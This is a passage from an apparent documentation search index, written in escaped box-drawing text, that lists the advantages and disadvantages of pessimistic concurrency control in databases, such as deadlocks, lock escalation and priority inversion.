\u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 \u2022 Low contention expected                               \u2502\n\u2502 \u2022 Read-heavy workload                                   \u2502\n\u2502 \u2022 Cost of retry is low                                  \u2502\n\u2502 \u2022 Distributed systems                                   \u2502\n\u2502 \u2022 Maximum concurrency needed                            \u2502\n\u2502 \u2022 Examples:                                             \u2502\n\u2502   - Content management systems                          \u2502\n\u2502   - Document editing                                    \u2502\n\u2502   - Product catalogs                                    \u2502\n\u2502   - User profiles                                       \u2502\n\u2502   - Caching layers                                      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#44-detailed-advantages-and-disadvantages-of-both-concurrency-controls","title":"4.4 Detailed Advantages and Disadvantages of Both Concurrency Controls","text":"<p>Description:</p> <p>Understanding the detailed advantages and disadvantages of each concurrency control approach is crucial for making informed architectural decisions. This section provides a comprehensive analysis of both approaches.</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#441-pessimistic-concurrency-control-detailed-analysis","title":"4.4.1 Pessimistic Concurrency Control - Detailed Analysis","text":"<p>Advantages:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    PESSIMISTIC CONTROL - ADVANTAGES                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u2705 NO WASTED WORK                                    \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Conflicts prevented upfront with locks   \u2502         \u2502\n\u2502 \u2502 \u2022 No transaction aborts or retries         \u2502         \u2502\n\u2502 \u2502 \u2022 Work done is guaranteed to commit        \u2502         \u2502\n\u2502 \u2502 \u2022 CPU/memory utilized efficiently          \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Example:                                   \u2502         \u2502\n\u2502 \u2502 100 transactions competing:                \u2502         \u2502\n\u2502 \u2502 \u2022 All 100 succeed (sequentially)           \u2502         \u2502\n\u2502 \u2502 \u2022 0 retries, 0 wasted computation          \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 2. \u2705 PREDICTABLE PERFORMANCE                           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Response time is consistent              \u2502         \u2502\n\u2502 \u2502 \u2022 Transaction either gets lock and proceeds\u2502         \u2502\n\u2502 \u2502   or waits in orderly queue                \u2502         \u2502\n\u2502 \u2502 \u2022 No sudden performance degradation        \u2502         \u2502\n\u2502 \u2502 \u2022 Easy to estimate latency                 \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Latency model:                             \u2502         \u2502\n\u2502 \u2502 Time = Lock_Wait + Processing_Time         \u2502         \u2502\n\u2502 \u2502 (Both predictable values)                  \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 3. \u2705 GUARANTEED SUCCESS (NO STARVATION)                \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Once lock acquired, commit guaranteed    \u2502         \u2502\n\u2502 \u2502 \u2022 FIFO queue ensures fairness              \u2502         \u2502\n\u2502 \u2502 \u2022 No transaction starves indefinitely      \u2502         \u2502\n\u2502 \u2502 \u2022 Every transaction eventually completes   \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Guarantee:                                 \u2502         \u2502\n\u2502 \u2502 If T waits for lock \u2192 T will get lock     \u2502         \u2502\n\u2502 \u2502 If T has lock \u2192 T will commit \u2713           \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 4. \u2705 STRONG CONSISTENCY                                \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Locks prevent concurrent modifications   \u2502         \u2502\n\u2502 \u2502 \u2022 Data integrity always maintained         \u2502         \u2502\n\u2502 \u2502 \u2022 No dirty reads, lost updates, or conflicts\u2502        \u2502\n\u2502 \u2502 \u2022 ACID properties fully enforced           \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Data guarantees:                           \u2502         \u2502\n\u2502 \u2502 \u2022 Read committed data only                 \u2502         \u2502\n\u2502 \u2502 \u2022 Writes are serializable                  \u2502         \u2502\n\u2502 \u2502 \u2022 Isolation levels strictly enforced       \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 5. \u2705 SIMPLE APPLICATION LOGIC                          \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 No retry logic needed                    \u2502         \u2502\n\u2502 \u2502 \u2022 No conflict detection code               \u2502         \u2502\n\u2502 \u2502 \u2022 Database handles all complexity          \u2502         \u2502\n\u2502 \u2502 \u2022 Straightforward error handling           \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Code simplicity:                           \u2502         \u2502\n\u2502 \u2502 BEGIN \u2192 Lock \u2192 Process \u2192 COMMIT           \u2502         \u2502\n\u2502 \u2502 (No complex retry loops)                   \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 6. \u2705 IDEAL FOR HIGH CONTENTION                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Prevents retry storms                    \u2502         \u2502\n\u2502 \u2502 \u2022 Orderly processing under load            \u2502         \u2502\n\u2502 \u2502 \u2022 System remains stable even when busy     \u2502         \u2502\n\u2502 \u2502 \u2022 Throughput degrades gracefully           \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 High contention behavior:                  \u2502         \u2502\n\u2502 \u2502 1000 transactions \u2192 queue \u2192 process        \u2502         \u2502\n\u2502 \u2502 System stable, no thrashing                \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 7. \u2705 EASIER DEBUGGING AND MONITORING                   \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Clear lock states (held/waiting)         \u2502         \u2502\n\u2502 \u2502 \u2022 Easy to identify bottlenecks             \u2502         \u2502\n\u2502 \u2502 \u2022 Lock wait graphs show dependencies       \u2502         \u2502\n\u2502 \u2502 \u2022 Predictable failure modes                \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Observability:                             \u2502         \u2502\n\u2502 \u2502 \u2022 See what locks are held                  \u2502         \u2502\n\u2502 \u2502 \u2022 Identify blocking transactions           \u2502         \u2502\n\u2502 \u2502 \u2022 Detect deadlocks automatically           \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 8. \u2705 DETERMINISTIC BEHAVIOR                            \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Same input \u2192 same execution order        \u2502         \u2502\n\u2502 \u2502 \u2022 Reproducible for testing                 \u2502         \u2502\n\u2502 \u2502 \u2022 Easier to reason about correctness       \u2502         \u2502\n\u2502 \u2502 \u2022 Simplified debugging                     \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Disadvantages:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    PESSIMISTIC CONTROL - DISADVANTAGES                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u274c BLOCKING AND REDUCED THROUGHPUT                   \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Transactions wait for locks              \u2502         \u2502\n\u2502 \u2502 \u2022 Concurrent execution limited             \u2502         \u2502\n\u2502 \u2502 \u2022 Lower overall throughput                 \u2502         \u2502\n\u2502 \u2502 \u2022 CPU underutilized (waiting, not working) \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Impact:                                    \u2502         \u2502\n\u2502 \u2502 If T1 holds lock for 100ms:                \u2502         \u2502\n\u2502 \u2502 \u2022 T2 must wait 100ms (blocked)             \u2502         \u2502\n\u2502 \u2502 \u2022 T3 waits 200ms, T4 waits 300ms...        \u2502         \u2502\n\u2502 \u2502 \u2022 Linear degradation with contention       \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 2. \u274c DEADLOCK POSSIBILITY                              \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Circular lock dependencies can occur     \u2502         \u2502\n\u2502 \u2502 \u2022 Requires deadlock detection/prevention   \u2502         \u2502\n\u2502 \u2502 \u2022 Victim transaction must be aborted       \u2502         \u2502\n\u2502 \u2502 \u2022 Complexity in multi-resource scenarios   \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Example:                                   \u2502         \u2502\n\u2502 \u2502 T1: Lock(A) \u2192 Lock(B)                      \u2502         \u2502\n\u2502 \u2502 T2: Lock(B) \u2192 Lock(A)                      \u2502         \u2502\n\u2502 \u2502 Result: DEADLOCK! One must abort           \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Mitigation needed:                         \u2502         \u2502\n\u2502 \u2502 \u2022 Lock ordering protocols                  \u2502         \u2502\n\u2502 \u2502 \u2022 Timeout mechanisms                       \u2502         \u2502\n\u2502 \u2502 \u2022 Deadlock detection algorithms            \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 3. \u274c LOCK OVERHEAD AND MEMORY COST                     \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Lock structures consume memory           \u2502         \u2502\n\u2502 \u2502 \u2022 Lock manager overhead (CPU)              \u2502         \u2502\n\u2502 \u2502 \u2022 Deadlock detection costs resources       \u2502         \u2502\n\u2502 \u2502 \u2022 Lock table maintenance                   \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Resource consumption:                      \u2502         \u2502\n\u2502 \u2502 \u2022 Each lock: ~100-500 bytes memory         \u2502         \u2502\n\u2502 \u2502 \u2022 Lock acquisition: ~10-50 CPU cycles      \u2502         \u2502\n\u2502 \u2502 \u2022 Deadlock detection: periodic scans       \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Scale impact:                              \u2502         \u2502\n\u2502 \u2502 10,000 concurrent transactions:            \u2502         \u2502\n\u2502 \u2502 \u2022 1-5 MB lock memory                       \u2502         \u2502\n\u2502 \u2502 \u2022 Significant CPU for management           \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 4. \u274c LOCK ESCALATION ISSUES                            \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Too many row locks \u2192 table lock          \u2502         \u2502\n\u2502 \u2502 \u2022 Reduces concurrency dramatically         \u2502         \u2502\n\u2502 \u2502 \u2022 Unexpected blocking of other transactions\u2502         \u2502\n\u2502 \u2502 \u2022 Difficult to predict/control             \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Scenario:                                  \u2502         \u2502\n\u2502 \u2502 T1 updates 5,000 rows:                     \u2502         \u2502\n\u2502 \u2502 \u2022 Acquires 5,000 row locks                 \u2502         \u2502\n\u2502 \u2502 \u2022 Database escalates to table lock!        \u2502         \u2502\n\u2502 \u2502 \u2022 Now ENTIRE table locked                  \u2502         \u2502\n\u2502 \u2502 \u2022 All other transactions blocked           \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 5. \u274c POOR SCALABILITY IN DISTRIBUTED SYSTEMS           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Distributed locks expensive              \u2502         \u2502\n\u2502 \u2502 \u2022 Network latency amplifies wait time      \u2502         \u2502\n\u2502 \u2502 \u2022 Lock coordination overhead               \u2502         \u2502\n\u2502 \u2502 \u2022 Difficult to maintain across nodes       \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Distributed challenges:                    \u2502         \u2502\n\u2502 \u2502 \u2022 Lock acquisition: 50-200ms (network RTT) \u2502         \u2502\n\u2502 \u2502 \u2022 Deadlock detection across nodes: complex \u2502         \u2502\n\u2502 \u2502 \u2022 Lock manager becomes bottleneck          \u2502         \u2502\n\u2502 \u2502 \u2022 Network partitions cause issues          \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 6. \u274c REDUCED CONCURRENCY FOR READS                     \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Read locks block writes                  \u2502         \u2502\n\u2502 \u2502 \u2022 Write locks block reads                  \u2502         \u2502\n\u2502 \u2502 \u2022 Even non-conflicting operations wait     \u2502         \u2502\n\u2502 \u2502 \u2022 Lower read throughput                    \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Example:                                   \u2502         \u2502\n\u2502 \u2502 T1 writing row X:                          \u2502         \u2502\n\u2502 \u2502 \u2022 T2 wants to read row X \u2192 BLOCKED         \u2502         \u2502\n\u2502 \u2502 \u2022 T3 wants to read row X \u2192 BLOCKED         \u2502         \u2502\n\u2502 \u2502 \u2022 Even though reads don't conflict!        \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 7. \u274c PRIORITY INVERSION RISK                           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Low priority transaction holds lock      \u2502         \u2502\n\u2502 \u2502 \u2022 High priority transaction must wait      \u2502         \u2502\n\u2502 \u2502 \u2022 Inverted execution order                 \u2502         \u2502\n\u2502 \u2502 \u2022 Can cause critical delays                \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Scenario:                                  \u2502         \u2502\n\u2502 \u2502 Low-priority batch job: locks data         \u2502         \u2502\n\u2502 \u2502 High-priority user request: must wait!     \u2502         \u2502\n\u2502 \u2502 User sees slow response time               \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 8. \u274c LOCK TIMEOUT COMPLEXITY                           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Need to set appropriate timeout values   \u2502         \u2502\n\u2502 \u2502 \u2022 Too short: unnecessary aborts            \u2502         \u2502\n\u2502 \u2502 \u2022 Too long: long wait times                \u2502         \u2502\n\u2502 \u2502 \u2022 Different workloads need different values\u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#442-optimistic-concurrency-control-detailed-analysis","title":"4.4.2 Optimistic Concurrency Control - Detailed Analysis","text":"<p>Advantages:</p> 